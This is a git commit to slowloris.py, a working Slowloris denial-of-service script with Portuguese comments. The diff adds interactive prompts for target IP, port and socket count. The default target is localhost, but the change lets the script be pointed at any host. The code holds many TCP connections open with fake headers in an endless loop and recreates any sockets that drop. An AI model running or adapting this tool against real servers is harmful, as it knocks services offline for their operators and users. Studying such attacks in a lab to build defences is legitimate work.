cdaa5504a008287eb4fe2dcc216c871d0e21da93
Thiago César Rodrigues <thiacefilho@gmail.com>
2026-08-04 12:32:08 -0300

    feat(cli): implementar opções de ataque no CLI

--- slowloris.py
+++ slowloris.py
@@ -12,16 +12,14 @@ HEADERS = [
 ]
 lista_sockets = []
 
-HOST_ALVO = "127.0.0.1" # localhost
-PORTA_ALVO = 3000
 
-def init_socket():
+def init_socket(host_alvo, porta_alvo):
     #cria socket TCP IPv4 na rede local, com timeout de 10 segundos
     socket_atck = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
     socket_atck.settimeout(10)
 
     # conecta o socket ao host que vai ser atacado
-    endereco_conexao = (HOST_ALVO, PORTA_ALVO)
+    endereco_conexao = (host_alvo, porta_alvo)
     socket_atck.connect(endereco_conexao)
 
     # aqui coloca o pacote inicial 
@@ -49,23 +47,23 @@ def enviar_header(socket_atck):
 
 
 # implementação slowloris
-def ataque_slowloris(numero_sockets):    # usar 200 sockets como numero padrão de quantidade
+def ataque_slowloris(numero_sockets, host_alvo, porta_alvo):    # usar 200 sockets como numero padrão de quantidade
     # criação dos sockets de ataque
     for _ in range(numero_sockets):
-        socket_atck = init_socket()
+        socket_atck = init_socket(host_alvo, porta_alvo)
 
         if socket_atck:
             lista_sockets.append(socket_atck)
             print(f"socket {len(lista_sockets)} criado")
 
+    # ataque continuo slowloris, usando headers falsos para manter conexão viva
     while True:
-        # ataque continuo slowloris, usando headers falsos para manter conexão viva
         for socket_atck in lista_sockets:
             enviar_header(socket_atck)
 
         # recria sockets se a quantidade baixar por algum motivo
         for _ in range(numero_sockets - len(lista_sockets)):
-            socket_atck = init_socket()
+            socket_atck = init_socket(host_alvo, porta_alvo)
 
             if socket_atck:
                 lista_sockets.append(socket_atck)
@@ -75,5 +73,18 @@ def ataque_slowloris(numero_sockets):    # usar 200 sockets como numero padrão 
 
 
 if __name__ == "__main__":
-    num_sockets = 200
-    ataque_slowloris(num_sockets)
+    print("Opções do ataque slowloris (CTRL + C para parar o ataque):")
+
+    host_padrao = "127.0.0.1" # localhost
+    host_alvo = input(f"IP do host alvo(Padrão é localhost {host_padrao}): ")
+    host_alvo = str(host_alvo) if host_alvo.strip() != "" else host_padrao
+
+    porta_padrao = 3000
+    porta_alvo = input(f"Porta alvo(Padrão é {porta_padrao}): ")
+    porta_alvo = int(porta_alvo) if porta_alvo.strip() != "" else porta_padrao
+
+    sockets_padrao = 150
+    num_sockets = input(f"Numero de sockets para o ataque(Padrão é {sockets_padrao}): ")
+    num_sockets = int(num_sockets) if num_sockets.strip() != "" else sockets_padrao
+
+    ataque_slowloris(num_sockets, host_alvo, porta_alvo)
